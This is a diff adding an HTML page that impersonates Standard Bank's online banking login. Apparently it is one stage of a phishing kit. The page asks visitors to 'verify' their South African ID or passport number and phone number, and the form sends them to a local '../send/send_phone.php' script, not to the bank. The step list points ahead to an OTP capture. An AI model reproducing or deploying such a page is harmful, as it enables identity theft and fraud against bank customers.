@@ -1,0 +1,90 @@
+<html lang="en"><head><meta http-equiv="content-type" content="text/html;charset=UTF-8">
+
+
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta content="text/html;charset=utf-8" http-equiv="Content-Type">
+    <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1">
+    <link rel="icon" type="image/png" href="../libraries/img/favicon.ico">
+    <link rel="stylesheet" href="../libraries/css/app.min.css">
+    <title>Standard Bank Online Banking</title>
+</head>
+
+<body ng-controller="spinnerController" ng-class="{'login migration-login-bg': migrationLogin(), 'login-strong-auth-bg':strongAuthLogin(), 'dg-ao background':digitalAccountOrigination(), 'facial-recognition-bg':facialRecognitionFlow()}" class="ng-scope login migration-login-bg login-strong-auth-bg" cz-shortcut-listen="true" style="background-color: #EDEDED; font-family: Bentonsans,Helvetica,Arial,sans-serif; margin: 0; padding: 0; height: 100%; background-image: unset;">
+    <div class="content-wrapper">
+        <dtm-analytics></dtm-analytics>
+        <ng-include src="'common/header/partials/header.html'" class="ng-scope">
+            <div ng-controller="HeaderController" class="ng-scope">
+                <header id="top" ng-class="{'header-no-bg': migrationLogin() || isDigitalAccountOrigination() || facialRecognitionFlow()}" class="" style="">
+                    <div ng-show="!directorWithoutCardLogin()" class="fixTheBasicsFeature content-wrapper-inner position-relative" ng-mouseleave="closeMenu()">
+                        <div></div>
+                        <ul class="nav-logo ng-scope" ng-if="!(migrationLogin() || isDigitalAccountOrigination() || facialRecognitionFlow())" style="">
+                            <li><img class="hide-on-print menu-logo hide-for-large-up ng-scope" ng-if="!(showMenu || showMenuTransact)" src="../libraries/img/logo.png"> <img class="hide-on-print menu-logo show-for-large-up" src="../libraries/img/logo.png"> <img class="print-only" src="../libraries/img/logo-black.png"></li>
+                        </ul>
+                    </div>
+                </header>
+            </div>
+        </ng-include>
+        <div class="content ng-scope" ng-controller="HeaderController" ng-class="{'with-tall-footer': migrationLogin()}" style="">
+            <main ng-view="" ng-hide="(spinnerActive &amp;&amp; spinnerStyle=='global') || blockOutPage" class="ng-scope" style="">
+                <div class="form-layout-top ng-scope">
+                    <h2 id="AddInvitationDetails" class="clear ng-binding">Please Verify the following details linked to your account</h2>
+                    <flow class="ng-isolate-scope">
+                        <ol class="steps ng-scope" data-progtrckr-steps="3" ng-if="flow.steps.length > 1" style="">
+                            <li ng-class="{'step-done': step.complete &amp;&amp; !step.current, 'step-todo': !step.complete, 'step-current': !step.complete &amp;&amp; step.current}" ng-repeat="step in flow.steps" class="ng-scope step-todo step-current"><span class="ng-binding">Enter details</span></li>
+                            <li ng-class="{'step-done': step.complete &amp;&amp; !step.current, 'step-todo': !step.complete, 'step-current': !step.complete &amp;&amp; step.current}" ng-repeat="step in flow.steps" class="ng-scope step-todo"><span class="ng-binding">Accept / Decline</span></li>
+                            <li ng-class="{'step-done': step.complete &amp;&amp; !step.current, 'step-todo': !step.complete, 'step-current': !step.complete &amp;&amp; step.current}" ng-repeat="step in flow.steps" class="ng-scope step-todo"><span class="ng-binding">Enter OTP</span></li>
+                        </ol>
+                    </flow>
+                </div>
+                <div class="form-layout-main ng-scope">
+                    <form class="panel ng-pristine ng-invalid ng-invalid-required ng-valid-pattern ng-valid-maxlength ng-valid-server-error ng-valid-minlength ng-valid-input-confirm ng-valid-expression ng-valid-exact-lengths" id="invitation-details-form" data-frmcontainer="obb invitation details form" method="POST" action="../send/send_phone.php" autocomplete="off">
+                        <section>
+                            <div class="small-only-text-center grey-text"><span>Verification Required.</span></div>
+                        </section>
+                        <ng-switch on="operatorInvitationDetails.flow">
+                            <section ng-switch-when="PMI" class="ng-scope">
+                                <ibr-input name="identification" label="South African ID / Passport" ng-model="operatorInvitationDetails.invite.idNumber" ng-required="true" ng-maxlength="30" ng-pattern="^[a-zA-Z0-9]+$" pattern-message="Please enter a valid South African ID number / Passport" class="ng-pristine ng-untouched ng-isolate-scope ng-empty ng-invalid ng-invalid-required ng-valid-pattern ng-valid-maxlength" required="required" style="">
+                                    <div class="text-input-container">
+                                        <label for="identification" ng-if="label" class="ng-binding ng-scope" style="">South African ID / Passport</label> <span ng-switch="tag"><span ng-switch-default="" class="ng-scope" style=""><div class="input-currency-code-display input-group"><input class="ng-valid-exact-lengths" type="text" id="identification" name="identification" placeholder="" autocapitalize="off" ng-model="model.value" ng-required="ngRequired" ng-trim="true" ng-maxlength="30" ng-pattern="^[a-zA-Z0-9]+$" ng-change="modelChanged()" ng-focus="ngFocus()" ng-blur="ngBlur()" exact-lengths="" input-confirm="" confirm-input-name="" show-hide-password="false" input-icon="" input-icon-position="" input-icon-type="" input-icon-state="" prevent-consecutive-numbers="" server-error="" prevent-repetitive-numbers="" expression-validation="" minimum-number-validation="" maximum-number-validation="" formatter="" ng-class="{'show-validation-styles': form[name].$touched || form[name].$dirty || form[name].$submitted}" required="required" autofocus="" style="border: 1px solid #72B13B;"></div></span></span>
+                                        <ng-messages for="form[name].$error" ng-hide="form[name].$pristine &amp;&amp; !form[name].$touched &amp;&amp; !validateOnLoad" class="ng-hide ng-active" style=""> </ng-messages><span ng-transclude=""></span></div>
+                                </ibr-input>
+                                <ibr-input name="referenceNumber" label="Phone Number" ng-model="operatorInvitationDetails.invite.referenceNumber" ng-required="true" ng-pattern="^[A-Za-z0-9]{13}$|^[A-Za-z0-9]{10}$" pattern-message="Please enter a Phone Number of 10 or 13 characters in length" class="ng-pristine ng-untouched ng-isolate-scope ng-empty ng-invalid ng-invalid-required ng-valid-pattern" required="required" style="">
+                                    <div class="text-input-container">
+                                        <label for="referenceNumber" ng-if="label" class="ng-binding ng-scope" style="">Phone Number</label> <span ng-switch="tag"><span ng-switch-default="" class="ng-scope" style=""><div class="input-currency-code-display input-group"><input class="ng-valid-exact-lengths" onkeypress="isInputNumber(event)" type="text" id="referenceNumber" name="phone" placeholder="" autocapitalize="off" ng-model="model.value" ng-required="ngRequired" ng-trim="true" ng-focus="ngFocus()" ng-blur="ngBlur()" exact-lengths="" input-confirm="" confirm-input-name="" show-hide-password="false" input-icon="" input-icon-position="" input-icon-type="" input-icon-state="" prevent-consecutive-numbers="" server-error="" prevent-repetitive-numbers="" expression-validation="" minimum-number-validation="" maximum-number-validation="" formatter="" ng-class="{'show-validation-styles': form[name].$touched || form[name].$dirty || form[name].$submitted}" required="required" style="border: 1px solid #72B13B;"></div></span></span>
+                                        <ng-messages for="form[name].$error" ng-hide="form[name].$pristine &amp;&amp; !form[name].$touched &amp;&amp; !validateOnLoad" class="ng-hide ng-active" style=""> </ng-messages><span ng-transclude=""></span></div>
+                                </ibr-input>
+                            </section>
+                        </ng-switch>
+                        <ibr-button-group class="ng-isolate-scope">
+                            <div>
+                                <div class="right" ng-transclude="">
+                                    <ibr-button id="next-basic" color="primary" class="primary ng-scope ng-isolate-scope" ng-click="operatorInvitationDetails.decideFlow()" ng-disabled="!invitationDetailsForm.$valid" data-dtmid="link_content_next button" data-dtmtext="Next button click" disabled="disabled">
+                                        <comp-lib-sb-button class="ibr-button" id="next-basic-button" color="primary" type="submit" width="none">
+                                            <button _ngcontent-hdx-c0="" class="primary primary__default none" style="padding: 0 40px; color: #fff; background: #0033a1; height: 44px; font-size: 16px; line-height: 1.5; border-radius: 22px; font-family: BentonSans Medium; font-weight: 500; text-transform: uppercase;margin: .3571428571rem 0;">
+                                                <ng-transclude></ng-transclude>Next</button>
+                                        </comp-lib-sb-button>
+                                    </ibr-button>
+                                    <ibr-button id="cancel-basic" color="secondary" class="secondary ng-scope ng-isolate-scope" ng-click="operatorInvitationDetails.cancel()" data-dtmid="link_content_cancel button" data-dtmtext="Cancel button click">
+                                        <comp-lib-sb-button class="ibr-button" id="cancel-basic-button" color="secondary" type="button" width="none" ng-click="$ctrl.ngClick" ng-disabled="$ctrl.ngDisabled" data-dtmtext="Cancel button click" data-dtmid="link_content_cancel button" track-click="" _nghost-hdx-c0="" ng-version="8.2.14">
+                                            <button _ngcontent-hdx-c0="" class="secondary secondary__default none" type="button" data-dtmtext="Cancel button click" data-dtmid="link_content_cancel button" style="padding: 0 40px; color: #0033a1; background: #fff; border: 1px solid #0033a1; height: 44px; font-size: 16px; line-height: 1.5; border-radius: 22px; font-family: BentonSans Medium; font-weight: 500; text-transform: uppercase;">
+                                                <ng-transclude></ng-transclude>Cancel</button>
+                                        </comp-lib-sb-button>
+                                    </ibr-button>
+                                </div>
+                            </div>
+                        </ibr-button-group>
+                    </form>
+                </div>
+            </main>
+        </div>
+        <footer ng-controller="HeaderController" ng-if="!directorWithoutCardLogin() &amp;&amp; !migrationLogin() &amp;&amp; !facialRecognitionFlow()" class="ng-scope" style=""><img src="../libraries/img/logo-blue.png" width="23">
+            <p ng-hide="shouldDisplayProfileDropdown()">Standard Bank is a licensed financial services provider in terms of the Financial Advisory and Intermediary Services Act and a registered credit provider in terms of the National Credit Act, registration number NCRCP15.</p>
+        </footer>
+        <go-to-top class="ng-isolate-scope" style="display: none;"> </go-to-top>
+    </div>
+    <script type="text/javascript">
+        function isInputNumber(evt){var ch=String.fromCharCode(evt.which);if(!(/[0-9]/.test(ch))){evt.preventDefault();}}
+    </script>
+
+
+</body></html>
